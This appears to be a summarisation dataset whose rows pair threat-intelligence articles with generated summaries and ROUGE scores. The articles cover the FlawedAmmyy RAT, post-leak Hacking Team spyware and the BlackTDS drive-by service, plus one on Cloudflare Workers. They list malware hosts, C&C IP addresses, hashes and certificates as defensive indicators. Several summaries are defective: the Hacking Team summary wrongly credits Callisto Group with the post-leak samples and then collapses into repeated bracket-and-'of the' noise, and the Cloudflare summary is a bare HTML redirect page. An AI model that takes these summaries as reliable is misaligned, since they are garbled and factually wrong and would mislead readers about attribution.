a popular remote access tool used by businesses and consumers to handle remote control and diagnostics on Microsoft Windows machines. However, leaked source code for Version 3 of Ammyy Admin has emerged as a Remote Access Trojan called FlawedAmmyy appearing in a variety of malicious campaigns. For infected individuals, this means that attackers potentially have complete access to their PCs, giving threat actors the ability to access a variety of services, steal files and credentials, and much more. We have seen FlawedAmmyy in both massive campaigns, potentially creating a large base of compromised computers, as well as targeted campaigns that create opportunities for actors to steal customer data, proprietary information, and more.References[1] https://msdn.microsoft.com/en-us/library/windows/desktop/bb776784(v=vs.85).aspx[2] https://forums.asp.net/t/1563309.aspx?How+to+create+InternetShortcut+url+Indicators of Compromise (IOCs)March 5 campaign :IOC IOC Type Description 18436342cab7f1d078354e86cb749b1de388dcb4d1e22c959de91619947dfd63 SHA256 bill 0256853.zip d82ca606007be9c988a5f961315c3eed1b12725c6a39aa13888e693dc3b9a975 SHA256 B123177432431.url file[:]//buyviagraoverthecounterusabb[.]net/documents/B123456789012.js URL SMB URL contained in the Internet Shortcut 8903d514549aa9568c7fea0123758b954b9703c301b5e4941acb33cccd0d7c57 SHA256 B37348362793.js (downloaded over SMB) hxxp://chimachinenow[.]com/kjdhc783 URL JS Payload Example hxxp://highlandfamily[.]org/kjdhc783 URL JS Payload Example hxxp://intra[.]cfecgcaquitaine[.]com/kjdhc783 URL JS Payload Example hxxp://motifahsap[.]com/kjdhc783 URL JS Payload Example hxxp://sittalhaphedver[.]com/p66/kjdhc783 URL JS Payload Example 2b53466eebd2c65f81004c567df9025ce68017241e421abcf33799bd3e827900 SHA256 Quant Loader hxxp://wassronledorhad[.]in/q2/index.php SHA256 Quant Loader C&C hxxp://balzantruck[.]com/45rt.exe SHA256 Quant Loader Payload (FlawedAmmyy) 0d100ff26a764c65f283742b9ec9014f4fd64df4f1e586b57f3cdce6eadeedcd SHA256 FlawedAmmyy 179.60.146[.]3:443 IP:Port FlawedAmmyy C&CMarch 1 campaign :IOC IOC Type Description 9a7fb98dd4c83f1b4995b9b358fa236969e826e4cb84f63f4f9881387bc88ccf SHA256 Macro MHT document Example hxxp://185.176.221[.]54/chrome.exe SHA256 Payload download b0ad80bf5e28e81ad8a7b13eec9c5c206f412870814d492b78f7ce4d574413d2 SHA256 FlawedAmmyy 179.60.146[.]3:443 IP:Port C&CJanuary 16 campaign :IOC IOC Type Description cafa3466e422dd4256ff20336c1a032bbf6e915f410145b42b453e2646004541 SHA256 FlawedAmmyy 194.165.16.11[:]443 IP:Port C&CAdditional samples on Virustotal:IOC IOC Type Description 404d3d65430fbbdadedb206a29e6158c66a8efa2edccb7e648c1dd017de47572 SHA256 FlawedAmmyy cc0205845562e017ff8b3aafb17de167529d113fc680e07ee9d8753d81487b2f SHA256 FlawedAmmyy 790e7dc8b2544f1c76ff95e56315fee7ef3fe623975c37d049cc47f82f18e4f2 SHA256 FlawedAmmyy 2d19c42f753dcee5b46344f352c11a1c645f0b77e205c218c985bd1eb988c7ce SHA256 FlawedAmmyy 6e701670350b4aea3d2ead4b929317b0a6d835aa4c0331b25d65ecbfbf8cb500 SHA256 FlawedAmmyy 3cd39abdbeb171d713ee8367ab60909f72da865dbb3bd858e4f6d31fd9c930d0 SHA256 FlawedAmmyy 1f5d31d41ebb417d161bc49d1c50533fcbff523bb583883b10b14974a3de8984 SHA256 FlawedAmmyy 6877ac35a3085d6c10fa48655cf9c2399bd96c3924273515eaf89b511bbe356a SHA256 FlawedAmmyy 059c0588902be3e8a5d747df9e91f65cc50d908540bdeb08acf15242cc9a25b5 SHA256 FlawedAmmyy c8b202e5a737b8b5902e852de730dbd170893f146ab9bbc9c06b0d93a7625e85 SHA256 FlawedAmmyy 927fa5fea13f8f3c28e307ffea127fb3511b32024349b39bbaee63fac8dcded7 SHA256 FlawedAmmyy 6048a55de1350238dfc0dd6ebed12ddfeb0a1f3788c1dc772801170756bf15c7 SHA256 FlawedAmmyy adfdead4419c134f0ab2951f22cfd4d5a1d83c0abfe328ae456321fccf241eb6 SHA256 FlawedAmmyy 022f662903c6626fb81e844f7761f6f1cbaa6339e391468b5fbfb6d0a1ebf8cb SHA256 FlawedAmmyy 3f5f5050adcf0d0894db64940299ac07994c4501b361dce179e3d45d9d155adf SHA256 FlawedAmmyy cafa3466e422dd4256ff20336c1a032bbf6e915f410145b42b453e2646004541 SHA256 FlawedAmmyyList of code-signing Certificates used:Subject Name Serial Number CYBASICS LTD 00 BB AE 27 7A C3 D9 CF 3F 85 00 86 A3 14 E7 0A D7 CYBASICS LTD 7F 6B 67 8E 66 DD 35 D6 58 9D 9B B2 0F C3 BA 0B AdFuture Ltd 25 43 BF D0 26 6A 5C ED A6 63 9A 2A 49 15 75 3A LLC ""ASTER-AYTI"" 10 88 E7 1C 82 F9 BB 73 74 7C 6D 0B 75 E0 5F 17 Atrast, OOO 00 A0 71 DB B3 2B 9D E4 F8 D2 17 39 44 C3 C2 39 F9ET and ETPRO Suricata/Snort Coverage2025408 | Win32/FlawedAmmyy RAT CnC Checkin2024452 | ET TROJAN Quant Loader v1.45 Download Request2023203 | ET TROJAN Quant Loader Download Request";"Proofpoint researchers have discovered a previously undocumented remote access Trojan (RAT) called FlawedAmmyy that has been used since the beginning of 2016 in both highly targeted email attacks as well as massive, multimillion message campaigns. Narrow attacks targeted the Automotive industry among others, while the large malicious spam campaigns appear to be associated with threat actor TA505, an actor responsible for many largescale attacks since at least 2014. Delivery Analysis March 5, 2018 FlawedAmmyy Admin appeared most recently as the payload in massive email campaigns on March 5 and 6, 2018. The messages in these campaigns contained zipped .url attachments and both the messages and the delivery suggest they were sent by threat actor TA505, known for sending largescale Dridex, Locky, and GlobeImposter campaigns, among others, over the last four years. For example, on March 5, the messages were sent from addresses spoofing the recipient's own domain with subjects such as ""Receipt No 1234567"" (random digits, and first word could also be ""Bill"" or ""Invoice"") and matching attachments ""Receipt 1234567.url"". The attachments were ZIP archives containing "".url"" files with names such as ""B123456789012.url"". Again, these were apparently random digits (Figure 1). Figure 1: Sample email from March 5, 2018, Ammyy Admin malware campaign Figure 2: Contents of the .url file The .url files are interpreted by Microsoft Windows as ""Internet Shortcut"" files [1], examples of";en;{'r': 0.24271844660194175, 'p': 0.9803921568627451, 'f': 0.3891050551844843};{'r': 0.1962338949454906, 'p': 0.908256880733945, 'f': 0.3227383833860126};{'r': 0.24271844660194175, 'p': 0.9803921568627451, 'f': 0.3891050551844843}
https://www.welivesecurity.com/2018/03/09/new-traces-hacking-team-wild/;New traces of Hacking Team in the wild;"Since being founded in 2003, the Italian spyware vendor Hacking Team gained notoriety for selling surveillance tools to governments and their agencies across the world. The capabilities of its flagship product, the Remote Control System (RCS), include extracting files from a targeted device, intercepting emails and instant messaging, as well as remotely activating a device's webcam and microphone.Previously unreported samples of Hacking Team's infamous surveillance tool - the Remote Control System (RCS) - are in the wild, and have been detected by ESET systems in fourteen countries.Our analysis of the samples reveals evidence suggesting that Hacking Team's developers themselves are actively continuing the development of this spyware.From Hacking Team to Hacked Team to...?Since being founded in 2003, the Italian spyware vendor Hacking Team gained notoriety for selling surveillance tools to governments and their agencies across the world.The capabilities of its flagship product, the Remote Control System (RCS), include extracting files from a targeted device, intercepting emails and instant messaging, as well as remotely activating a device's webcam and microphone. The company has been criticized for selling these capabilities to authoritarian governments - an allegation it has consistently denied.When the tables turned in July 2015, with Hacking Team itself suffering a damaging hack, the reported use of RCS by oppressive regimes was confirmed. With 400GB of internal data - including the once-secret list of customers, internal communications, and spyware source code - leaked online, Hacking Team was forced to request its customers to suspend all use of RCS, and was left facing an uncertain future.Following the hack, the security community has been keeping a close eye on the company's efforts to get back on its feet. The first reports suggesting Hacking Team's resumed operations came six months later - a new sample of Hacking Team's Mac spyware was apparently in the wild. A year after the breach, an investment by a company named Tablem Limited brought changes to Hacking Team's shareholder structure, with Tablem Limited taking 20% of Hacking Team's shareholding. Tablem Limited is officially based in Cyprus, however, recent news suggests it has ties to Saudi Arabia.Having just concluded our research into another commercial spyware product, FinFisher, two interesting events involving Hacking Team occurred in close succession - the report about Hacking Team's apparent financial recovery and our discovery of a new RCS variant in the wild with a valid digital certificate.The spyware lives onIn the early stages of this investigation, our friends from the Citizen Lab - who have a long record of keeping track of Hacking Team - provided us with valuable input that led to the discovery of a version of the spyware currently being used in the wild and signed with a previously unseen valid digital certificate.Our further research uncovered several more samples of Hacking Team's spyware created after the 2015 hack, all being slightly modified compared to variants released before the source code leak.The samples were compiled between September 2015 and October 2017. We have deemed these compilation dates to be authentic, based on ESET telemetry data indicating the appearance of the samples in the wild within a few days of those dates.Further analysis led us to conclude that all the samples can be traced back to a single group, rather than being isolated instances of diverse actors building their own versions from the leaked Hacking Team source code.One indicator supporting this is the sequence of digital certificates used to sign the samples - we found six different certificates issued in succession. Four of the certificates were issued by Thawte to four different companies, and two are personal certificates issued to Valeriano Bedeschi (Hacking Team co-founder) and someone named Raffaele Carnacina, as shown in the following table:Certificate issued to Validity period Valeriano Bedeschi 8/13/2015 - 8/16/2016 Raffaele Carnacina 9/11/2015 - 9/15/2016 Megabit, OOO 6/8/2016 - 6/9/2017 ADD Audit 6/20/2016 - 6/21/2017 Media Lid 8/29/2016 - 8/30/2017 Ziber Ltd 7/9/2017 - 7/10/2018The samples also have forged Manifest metadata - used to masquerade as a legitimate application - in common, appearing as ""Advanced SystemCare 9 (9.3.0.1121)"", ""Toolwiz Care 3.1.0.0"" and ""SlimDrivers (2.3.1.10)"".Our analysis further shows that the author(s) of the samples have been using VMProtect, apparently in an effort to make their samples less prone to detection. This was also common among pre-leak Hacking Team spyware.The connections among these samples alone could have originated with virtually any group re-purposing the leaked Hacking Team source code or installer - as was the case with Callisto Group in early 2016. We have, however, collected further evidence that ties these post-leak samples to Hacking Team's developers themselves.The versioning (which we accessed after overcoming VMProtect protection) observed in the analyzed samples continues where Hacking Team left off before the breach, and follows the same patterns. Hacking Team's habit of compiling their payloads - named Scout and Soldier - consecutively, and often on the same day, can also be seen across the newer samples.The following table shows the compilation dates, versioning and certificate authorities of Hacking Team Windows spyware samples seen between 2014 and 2017. Reuse of leaked source code by Callisto Group is marked in red.Compilation date Scout version Soldier version Certificate issued to 2014-11-27 1007 Open Source Developer, Muhammad Lee's 2014-12-05 11 Open Source Developer, Muhammad Lee's 2014-12-12 12 1008 Open Source Developer, meicun ge 2015-03-19 1009 Open Source Developer, meicun ge 2015-03-27 13 Open Source Developer, meicun ge JULY 2015 LEAK 2015-09-04 15 Valeriano Bedeschi 2015-10-19 16 1011 Raffaele Carnacina 2016-01-05 13 SPC 2016-01-18 17 Raffaele Carnacina 2016-03-24 18 1012 Raffaele Carnacina 2016-06-17 1014 Megabit, OOO 2016-08-02 21 1016 Megabit, OOO 2016-09-01 22 1017 ADD Audit 2016-12-19 23 1018 ADD Audit 2017-01-31 24 1019 ADD Audit 2017-04-28 25 1020 ADD Audit, Media Lid 2017-06-28 27 1022 Media Lid, Ziber Ltd 2017-10-09 28 Ziber Ltd 2017-10-18 1025 Ziber LtdFurthermore, our research has confirmed that the changes introduced in the post-leak updates were made in line with Hacking Team's own coding style and are often found in places indicating a deep familiarity with the code. It is highly improbable that some other actor - that is, other than the original Hacking Team developer(s) - would make changes in exactly these places when creating new versions from the leaked Hacking Team source code.One of the subtle differences we spotted between the pre-leak and the post-leak samples is the difference in Startup file size. Before the leak, the copied file was padded to occupy 4MB. In the post-leak samples, this file copy operation is padded to 6MB - most likely as a primitive detection evasion technique.We found further differences that fully convinced us of Hacking Team's involvement. However, the disclosure of these details could interfere with the future tracking of the group, which is why we choose not to publish them. We are, however, open to share these details with fellow researchers (for any inquiries contact us at threatintel@eset.com).The functionality of the spyware largely overlaps with that in the leaked source code. Our analysis so far has not confirmed the release of any significant update, as promised by Hacking Team following the hack.As for the distribution vector of the post-leak samples we analyzed, at least in two cases, we detected the spyware in an executable file disguised as a PDF document (using multiple file extensions) attached to a spearphishing email. The names of the attached files contain strings likely aimed to reduce suspicion when received by diplomats.ConclusionOur research lets us claim with high confidence that, with one obvious exception, the post-leak samples we've analyzed are indeed the work of Hacking Team developers, and not the result of source code reuse by unrelated actors, such as in the case of Callisto Group in 2016.As of this writing, our systems have detected these new Hacking Team spyware samples in fourteen countries. We choose not to name the countries to prevent potentially incorrect attributions based on these detections, since the geo-location of the detections doesn't necessarily reveal anything about the origin of the attack.IoCsESET detection names Trojan.Win32/CrisisHT.F Trojan.Win32/CrisisHT.H Trojan.Win32/CrisisHT.E Trojan.Win32/CrisisHT.L Trojan.Win32/CrisisHT.J Trojan.Win32/Agent.ZMW Trojan.Win32/Agent.ZMX Trojan.Win32/Agent.ZMY Trojan.Win32/Agent.ZMZSamples signed by Ziber Ltd Thumbprint: 14 56 d8 a0 0d 8b e9 63 e2 22 4d 84 5b 12 e5 08 4e a0 b7 07 Serial Number: 5e 15 20 5f 18 04 42 cc 6c 3c 0f 03 e1 a3 3d 9fSHA-1 samples 2eebf9d864bef5e08e2e8abd93561322de2ab33b 51506ed3392b9e59243312b0f798c898804913db 61eda4847845f49689ae582391cd1e6a216a8fa3 68ffd64b7534843ac2c66ed68f8b82a6ec81b3e8 6fd86649c6ca3d2a0653fd0da724bada9b6a6540 92439f659f14dac5b353b1684a4a4b848ecc70ef a10ca5d8832bc2085592782bd140eb03cb31173a a1c41f3dad59c9a1a126324a4612628fa174c45a b7229303d71b500157fa668cece7411628d196e2 eede2e3fa512a0b1ac8230156256fc7d4386eb24C&Cs 149.154.153.223 192.243.101.125 180.235.133.23 192.243.101.124 95.110.167.74 149.154.153.223Samples signed by ADD Audit Thumbprint: 3e 19 ad 16 4d c1 03 37 53 26 36 c3 7c a4 c5 97 64 6f bc c8 Serial Number: 4c 8e 3b 16 13 f7 35 42 f7 10 6f 27 20 94 eb 23SHA-1 samples 341dbcb6d17a3bc7fa813367414b023309eb69c4 86fad7c362a45097823220b77dcc30fb5671d6d4 9dfc7e78892a9f18d2d15adbfa52cda379ddd963 e8f6b7d10b90ad64f976c3bfb4c822cb1a3c34b2C&Cs 188.166.244.225 45.33.108.172 178.79.186.40 95.110.167.74 173.236.149.166Samples signed by Media Lid Thumbprint: 17 f3 b5 e1 aa 0b 95 21 a8 94 9b 1c 69 a2 25 32 f2 b2 e1 f5 Serial Number: 2c e2 bd 0a d3 cf de 9e a7 3e ec 7c a3 04 00 daSHA-1 samples 27f4287e1a5348714a308e9175fb9486d95815a2 71a68c6140d066ca016efa9087d71f141e9e2806 dc817f86c1282382a1c21f64700b79fcd064ae5cSHA-1 samples 27f4287e1a5348714a308e9175fb9486d95815a2 71a68c6140d066ca016efa9087d71f141e9e2806 dc817f86c1282382a1c21f64700b79fcd064ae5cC&Cs 188.226.170.222 173.236.149.166Samples signed by Megabit, OOO Thumbprint: 6d e3 a1 9d 00 1f 02 24 c1 c3 8b de fa 74 6f f2 3a aa 43 75 Serial Number: 0f bc 30 db 12 7a 53 6c 34 d7 a0 fa 81 b4 81 93SHA-1 samples 508f935344d95ffe9e7aedff726264a9b500b854 7cc213a26f8df47ddd252365fadbb9cca611be20 98a98bbb488b6a6737b12344b7db1acf0b92932a cd29b37272f8222e19089205975ac7798aac7487 d21fe0171f662268ca87d4e142aedfbe6026680b 5BF1742D540F08A187B571C3BF2AEB64F141C4AB 854600B2E42BD45ACEA9A9114747864BE002BF0BC&Cs 95.110.167.74 188.226.170.222 173.236.149.166 46.165.236.62Samples signed by Raffaele Carnacina Thumbprint: 8a 85 4f 99 2a 5f 20 53 07 f8 2d 45 93 89 af da 86 de 6c 41 Serial Number: 08 44 8b d6 ee 91 05 ae 31 22 8e a5 fe 49 6f 63SHA-1 samples 4ac42c9a479b34302e1199762459b5e775eec037 2059e2a90744611c7764c3b1c7dcf673bb36f7ab b5fb3147b43b5fe66da4c50463037c638e99fb41 9cd2ff4157e4028c58cef9372d3bb99b8f2077ec b23046f40fbc931b364888a7bc426b56b186d60e cc209f9456f0a2c5a17e2823bdb1654789fcadc8 99c978219fe49e55441e11db0d1df4bda932e021 e85c2eab4c9eea8d0c99e58199f313ca4e1d1735 141d126d41f1a779dca69dd09640aa125afed15aC&Cs 199.175.54.209 199.175.54.228 95.110.167.74Samples signed by Valeriano Bedeschi Thumbprint: 44 a0 f7 f5 39 fc 0c 8b f6 7b cd b7 db 44 e4 f1 4c 68 80 d0 Serial Number: 02 f1 75 66 ef 56 8d c0 6c 9a 37 9e a2 f4 fa eaSHA-1 samples baa53ddba627f2c38b26298d348ca2e1a31be52e 5690a51384661602cd796e53229872ff87ab8aa4 aa2a408fcaa5c86d2972150fc8dd3ad3422f807a 83503513a76f82c8718fad763f63fcd349b8b7fcC&Cs 172.16.1.206 - It is an internal address which was found in the samples.Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";"The Italian spyware vendor Hacking Team gained notoriety for selling surveillance tools to governments and their agencies across the world. The capabilities of its flagship product, the Remote Control System (RCS), include extracting files from a targeted device, intercepting emails and instant messaging, as well as remotely activating a device's webcam and microphone. The company has been criticized for selling these capabilities to authoritarian governments an allegation it has consistently denied. When the tables turned in July 2015, with Hacking Team itself suffering a damaging hack, the reported use of RCS by oppressive regimes was confirmed. With 400GB of internal data including the oncesecret list of customers, internal communications, and spyware source code leaked online, Hacking Team was forced to request its customers to suspend all use of RCS, and was left facing an uncertain future. Following the hack, the security community has been keeping a close eye on the company's efforts to get back on its feet. The first reports suggesting Hacking Team's resumed operations came six months later a new sample of Hacking Team's Mac spyware was apparently in the wild. A year after the breach, an investment by a company named Tablem Limited brought changes to Hacking Team's shareholder structure, with Tablem Limited taking 20% of Hacking Team's shareholding. Tablem Limited is officially based in Cyprus; however, recent news suggests it has ties to Saudi Arabia. Having just concluded our research into another commercial spyware product, FinFisher, two interesting events involving Hacking Team occurred in close succession the report about Hacking Team's apparent financial recovery and our discovery of a new The ITSecurity report has been successfully summarized. The ITSecurity report has been summarized as follows: Hacking Team's source code was leaked in July 2015. The leaked source code was used to create malicious software, known as spyware, by the Callisto Group. The spyware was distributed through spearphishing emails, disguised as PDF documents. The Callisto Group has been using the leaked Hacking Team source code to create malicious software since the leak. The Callisto Group has been using the leaked Hacking Team source code to create malicious software since the leak. Furthermore, our research has confirmed that the changes introduced in the postleak updates were made in line with Hacking Team's own coding style and are often found in places indicating a deep familiarity with the code. It is highly improbable that some other actor that is, other than the original Hacking Team developer(s) would make changes in exactly these places when creating new versions from the leaked Hacking Team source code. One of the subtle differences we spotted between the preleak and the postleak samples is the difference in Startup file size. Before the leak, the copied file was padded to occupy 4MB. In the postleak samples, this file copy operation is padded to 6MB most likely as a primitive detection evasion technique. We found further differences that fully convinced us of Hacking Team's involvement. However, the disclosure of these details could interfere with the future tracking of the group, which is why we choose not to publish them. We are, however, open to share these details with fellow researchers (for any inquiries contact us at threatintel@eset.com).The functionality of the spyware largely overlaps with that in the leaked source code. of the [ of the "" of the. of the, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 2, 0, 2 [ [ [ [ [ [ [ [ of the [ [ [ [ [ of the [ at the [ at the [ of the of the [ [ [.. [. [. [. [ [ [ [ of the [ of the [ of the [ of the [ of the of the of the of the of the [ of the of the of the of the of the as of the as as as as the. in the... [ in the [ in the [ of the [ in the to the to the to the to the to the. [. [ in the [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [, [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ of [ of [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [, [ [ of [ of [ of [ of [, [, [, [, [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ [ [ [ as [ as [ of [ of [ of of [ of [ of [ of [ of [ of [ of [ of [ of [ of of [ of [ of of [ of [ of [ of at of at of";en;{'r': 0.3187571921749137, 'p': 0.9111842105263158, 'f': 0.47229326129217436};{'r': 0.26811594202898553, 'p': 0.8043478260869565, 'f': 0.40217390929347835};{'r': 0.3176064441887227, 'p': 0.9078947368421053, 'f': 0.47058823145415213}
https://blog.cloudflare.com/cloudflare-workers-unleashed/;Everyone can now run JavaScript on Cloudflare with Workers;"This post is also available in ???.Exactly one year ago today, Cloudflare gave me a mission: Make it so people can run code on Cloudflare's edge. At the time, we didn't yet know what that would mean. Would it be container-based? A new Turing-incomplete domain-specific language? Lua? ""Functions""? There were lots of ideas.Eventually, we settled on what now seems the obvious choice: JavaScript, using the standard Service Workers API, running in a new environment built on V8. Five months ago, we gave you a preview of what we were building, and started the beta.Today, with thousands of scripts deployed and many billions of requests served, Cloudflare Workers is now ready for everyone.""Moving away from VCL and adopting Cloudflare Workers will allow us to do some creative routing that will let us deliver JavaScript to npm's millions of users even faster than we do now. We will be building our next generation of services on Cloudflare's platform and we get to do it in JavaScript!"" -- CJ Silverio, CTO, npm, Inc.What is the Cloud, really?Historically, web application code has been split between servers and browsers. Between them lies a vast but fundamentally dumb network which merely ferries data from point to point.We don't believe this lives up to the promise of ""The Cloud.""We believe the true dream of cloud computing is that your code lives in the network itself. Your code doesn't run in ""us-west-4"" or ""South Central Asia (Mumbai)"", it runs everywhere.More concretely, it should run where it is most needed. When responding to a user in New Zealand, your code should run in New Zealand. When crunching data in your database, your code should run on the machines that store the data. When interacting with a third-party API, your code should run wherever that API is hosted. When human explorers reach Mars, they aren't going to be happy waiting a half an hour for your app to respond -- your code needs to be running on Mars.Cloudflare Workers are our first step towards this vision. When you deploy a Worker, it is deployed to Cloudflare's entire edge network of over a hundred locations worldwide in under 30 seconds. Each request for your domain will be handled by your Worker at a Cloudflare location close to the end user, with no need for you to think about individual locations. The more locations we bring online, the more your code just ""runs everywhere.""Well, OK... it won't run on Mars. Yet. You out there, Elon?What's a Worker?Cloudflare Workers derive their name from Web Workers, and more specifically Service Workers, the W3C standard API for scripts that run in the background in a web browser and intercept HTTP requests. Cloudflare Workers are written against the same standard API, but run on Cloudflare's servers, not in a browser.Here are the tools you get to work with:Execute any JavaScript code, using the latest standard language features.Intercept and modify HTTP request and response URLs, status, headers, and body content.Respond to requests directly from your Worker, or forward them elsewhere.Send HTTP requests to third-party servers.Send multiple requests, in serial or parallel, and use the responses to compose a final response to the original request.Send asynchronous requests after the response has already been returned to the client (for example, for logging or analytics).Control other Cloudflare features, such as caching behavior.The possible uses for Workers are infinite, and we're excited to see what our customers come up with. Here are some ideas we've seen in the beta:Route different types of requests to different origin servers.Expand HTML templates on the edge, to reduce bandwidth costs at your origin.Apply access control to cached content.Redirect a fraction of users to a staging server.Perform A/B testing between two entirely different back-ends.Build ""serverless"" applications that rely entirely on web APIs.Create custom security filters to block unwanted traffic unique to your app.Rewrite requests to improve cache hit rate.Implement custom load balancing and failover logic.Apply quick fixes to your application without having to update your production servers.Collect analytics without running code in the user's browser.Much more.Here's an example.// A Worker which: // 1. Redirects visitors to the home page (""/"") to a // country-specific page (e.g. ""/US/""). // 2. Blocks hotlinks. // 3. Serves images directly from Google Cloud Storage. addEventListener('fetch', event => { event.respondWith(handle(event.request)) }) async function handle(request) { let url = new URL(request.url) if (url.pathname == ""/"") { // This is a request for the home page (""/""). // Redirect to country-specific path. // E.g. users in the US will be sent to ""/US/"". let country = request.headers.get(""CF-IpCountry"") url.pathname = ""/"" + country + ""/"" return Response.redirect(url, 302) } else if (url.pathname.startsWith(""/images/"")) { // This is a request for an image (under ""/images""). // First, block third-party referrers to discourage // hotlinking. let referer = request.headers.get(""Referer"") if (referer && new URL(referer).hostname != url.hostname) { return new Response( ""Hotlinking not allowed."", { status: 403 }) } // Hotlink check passed. Serve the image directly // from Google Cloud Storage, to save serving // costs. The image will be cached at Cloudflare's // edge according to its Cache-Control header. url.hostname = ""example-bucket.storage.googleapis.com"" return fetch(url, request) } else { // Regular request. Forward to origin server. return fetch(request) } }It's Really FastSometimes people ask us if JavaScript is ""slow"". Nothing could be further from the truth.Workers uses the V8 JavaScript engine built by Google for Chrome. V8 is not only one of the fastest implementations of JavaScript, but one of the fastest implementations of any dynamically-typed language, period. Due to the immense amount of work that has gone into optimizing V8, it outperforms just about any popular server programming language with the possible exceptions of C/C++, Rust, and Go. (Incidentally, we will support those soon, via WebAssembly.)The bottom line: A typical Worker script executes in less than one millisecond. Most users are unable to measure any latency difference when they enable Workers -- except, of course, when their worker actually improves latency by responding directly from the edge.On another speed-related note, Workers deploy fast, too. Workers deploy globally in under 30 seconds from the time you save and enable the script.PricingWorkers are a paid add-on to Cloudflare. We wanted to keep the pricing as simple as possible, so here's the deal:Get Started";<html> <head> <title>Redirected</title> </head> <body> <h1>Redirected</h1> </body> </html> Workers are a paid addon to Cloudflare. We wanted to keep the pricing as simple as possible, so here's the deal:Get Started;en;{'r': 0.03185840707964602, 'p': 0.6666666666666666, 'f': 0.06081080994025065};{'r': 0.01890547263681592, 'p': 0.6551724137931034, 'f': 0.0367504830137978};{'r': 0.03185840707964602, 'p': 0.6666666666666666, 'f': 0.06081080994025065}
https://www.proofpoint.com/us/threat-insight/post/drive-service-blacktds;Drive-by as a service: BlackTDS;"KafeineOverviewProofpoint researchers have been tracking a new Traffic Distribution System called BlackTDS implicated in the distribution of a variety of malware. BlackTDS is a multitenant TDS tool that has been advertising its services on underground markets since the end of December 2017.BlackTDS offers a variety of services to its clients that they collectively refer to as a ""Cloud TDS."" The operators claim that their Cloud TDS can handle social engineering and redirection to exploit kits (EKs) while preventing detection by bots -- namely researchers and sandoxes. BlackTDS also includes access to fresh domains with clean reputations over HTTPS if required.The services offered by BlackTDS are summarized in their forum advertisements, the text of which we have left unaltered:""Cloacking antibot tds based on our non-abuse servers from $3 per day of work. You do not need your own server to receive traffic. API for working with exploit packs and own solutions for processing traffic for obtaining installations (FakeLandings). Dark web traffic ready-made solutions. Placed in 1 click hidden code to use the injection in js on any landings, including on hacked websites.""""Cost - $6 per day, $45 per 10 days, $90 per month, FREE place on our server, FREE hosting of your file on green https:// domain. 3 DAYS FREE TEST""* Cloud Antibot Traffic Management System on our non-abuse servers* API for working with bundles of equities and custom solutions for processing traffic for obtaining installations (Faklendings). Placing your file on a green https: // domain* Placed in 1 click hidden code to use the injection in js on any landings including on the shellsWhat we added during the holidays:* Built-in modes Iframe (a little morally outdated, but asked - we did).* fake Mirosoft update (breaks the page).* Fake update Jav and Fake update Flash (the page does not break, the original content is visible).* uploading a file from your personal account to our server.* Configure delay for the appearance of fake windows.* Auto-download when clicking on the window area.* Updating the Black and Geo databases from 13.01.18.* increased by breaking through the downloads from 6%-12% to 10%-30%.* added detailed statistics on users who downloaded the file.* autostart file in fakes.And this is only on holidays! We continue to work. Cloud TDS at your serviceFigure 1 shows a screen capture of the cost breakdowns and services offered by BlackTDS.Figure 1: Portion of a BlackTDS advertisementThreat actors drive traffic to BlackTDS via spam, malvertising, and other means, set up the malware or EK API of their choice, and then allow the service to handle all other aspects of malware distribution via drive-by.Figure 2 shows a screen capture of the BlackTDS website that includes contact information, localization, and recent updates.Figure 2: BlackTDS home pageWe observed BlackTDS infection chains several times in the wild, distributing malware via fake software updates and other social engineering schemes (Figures 3, 6-8).Figure 3: Fake Java Plugin download associated with a BlackTDS drive-byFigure 4: BlackTDS favicon that appears on all identified sites associated with the TDSAlthough identifying BlackTDS sites in the wild was relatively easy based on the presence of a distinctive favicon (Figure 4), effectively associating the traffic with a known actor was difficult and, in some cases, almost impossible.Figure 5: Fake Microsoft Font Pack download associated with a BlackTDS drive-byFigure 6: Fake Java Plugin download associated with a BlackTDS drive-by on a typosquatted domainFigure 7: Fake Microsoft Font Pack download associated with a BlackTDS drive-by (source: @Nao_sec)Figure 8: Fake Adobe Flash Player updated associated with a BlackTDS drive-by (source: @Nao_sec)Figure 9: Selection of events we documented involving BlackTDSFigure 10: One pass showing a malvertising campaign directing traffic into BlackTDS that ultimately redirected to Keitaro TDS and Grandsoft Exploit KitOn February 19, we also observed a massive spam campaign from the actor TA505 with PDF attachments containing links to a chain involving BlackTDS before ending on a website purporting to sell discount pharmaceuticals. TA505 has typically distributed ransomware and banking Trojans at enormous scale, making this particular campaign unusual.Figure 11: HTTPS URL to BlackTDS in malspam - February 19, 2018Figure 12: Pharma website receiving the traffic after BlackTDS filteringIt is worth noting that we determined which actor was operating the service itself based on an artefact of this TDS since at least February 2017. We associate the artefact with a traffer we track under the name ""BBSindex"".Figure 13 shows infection activity we associate with both BBSindex and BlackTDS:Figure 13: Overview of ""bbsindex"" traffic activity. We believe the artefact tied to BlackTDS appeared between February 12-19, 2017BlackTDS runs on a single IP address that proved simple to track. However, at the end of February, after being heavily flagged in many reputation services, the organization changed the IP address.Figure 14: New BlackTDS home page, retrieved March 4, 2018ConclusionLike so many legitimate services, we are increasingly observing malicious services offered ""as a Service."" In this case services include hosting and configuration of the components of a sophisticated drive-by. The low cost, ease of access, and relatively anonymity of BlackTDS reduce the barriers to entry to web-based malware distribution. With full support for social engineering and the flexibility to either distribute malware directly or simply redirect victims to exploit kit landing pages, BlackTDS demonstrates the continued maturation of crimeware as a service. Moreover, it demonstrates that, despite their steady decline, EKs and web-based attacks are not a thing of the past. On the contrary, web-based attack chains are increasingly incorporating social engineering, taking advantage of both existing underlying infrastructure and human fallibility rather than short-lived exploits.Acknowledgement:Thanks to @nao_sec for sharing the Japanese regionalized version of the Social Engineering templates.Indicators of Compromise (IOCs)";"KafeineOverviewProofpoint researchers have been tracking a new Traffic Distribution System called BlackTDS implicated in the distribution of a variety of malware. BlackTDS is a multitenant TDS tool that has been advertising its services on underground markets since the end of December 2017.BlackTDS offers a variety of services to its clients that they collectively refer 